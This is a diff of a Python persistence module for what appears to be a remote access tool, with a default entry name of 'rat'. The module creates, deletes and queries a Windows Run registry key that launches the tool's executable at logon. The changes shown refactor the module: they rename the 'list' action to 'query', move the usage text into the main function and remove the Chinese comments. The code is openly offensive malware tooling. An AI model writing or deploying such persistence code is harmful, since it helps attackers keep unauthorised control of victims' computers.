@@ -1,31 +1,32 @@
-# exec win/persist/registry.py --action create
-# exec win/persist/registry.py --action delete
-# exec win/persist/registry.py --action list --name MyApp
-# exec win/persist/registry.py --action list
-
 import winreg
 
 from core.utils.client_util import get_executable_path
 
-# 默认配置
 DEFAULT_NAME = 'rat'
 EXECUTABLE_PATH = get_executable_path()
 KEY_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
 
-def registry(action='list', name=None):
-    """注册表启动项管理
+def registry(action, name):
+    if action == 'help':
+        print('\n' + '=' * 50)
+        print('Registry Persistence Script')
+        print('=' * 50)
+        print('\nUsage:')
+        print('  --action create               Create registry key (default name: rat)')
+        print('  --action delete               Delete registry key (default name: rat)')
+        print('  --action query                Check if registry key exists (default name: rat)')
+        print('  --action query --name MyApp   Check specific registry key')
+        print('  --action create --name MyApp  Create with custom name')
+        print('  --action delete --name MyApp  Delete with custom name')
+        print('\nExamples:')
+        print('  exec win/persist/registry.py --action create')
+        print('  exec win/persist/registry.py --action query --name MyApp')
+        print('  exec win/persist/registry.py --action delete --name MyApp')
+        print('=' * 50)
+        return
 
-    Args:
-        action: create - 创建, delete - 删除, list - 查看
-        name: 注册表项名称，默认 rat
-        executable: 可执行文件路径，默认当前程序路径
-    """
-    # 设置默认值
-    if name is None:
-        name = DEFAULT_NAME
-
-    if action == 'list':
+    if action == 'query':
         # 检查指定项是否存在
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY_PATH, 0, winreg.KEY_READ)
@@ -57,35 +58,10 @@ def registry(action='list', name=None):
             print(f'  Path: {EXECUTABLE_PATH}')
         else:
             print(f'Unknown action: {action}')
-            print_usage()
     finally:
         winreg.CloseKey(key)
 
 
-def print_usage():
-    """打印使用说明"""
-    print('\n' + '=' * 50)
-    print('Registry Persistence Script')
-    print('=' * 50)
-    print('\nUsage:')
-    print('  --action create               Create registry key (default name: rat)')
-    print('  --action delete               Delete registry key (default name: rat)')
-    print('  --action list                 Check if registry key exists (default name: rat)')
-    print('  --action list --name MyApp    Check specific registry key')
-    print('  --action create --name MyApp  Create with custom name')
-    print('  --action delete --name MyApp  Delete with custom name')
-    print('\nExamples:')
-    print('  exec win/persist/registry.py --action create')
-    print('  exec win/persist/registry.py --action list --name MyApp')
-    print('  exec win/persist/registry.py --action delete --name MyApp')
-    print('=' * 50)
-
-
-# 从 kwargs 获取参数
-action = kwargs.get('action', 'list')
-name = kwargs.get('name', None)
-
-if action == 'help':
-    print_usage()
-else:
-    registry(action=action, name=name)
+action = kwargs.get('action', 'help')
+name = kwargs.get('name', DEFAULT_NAME)
+registry(action=action, name=name)
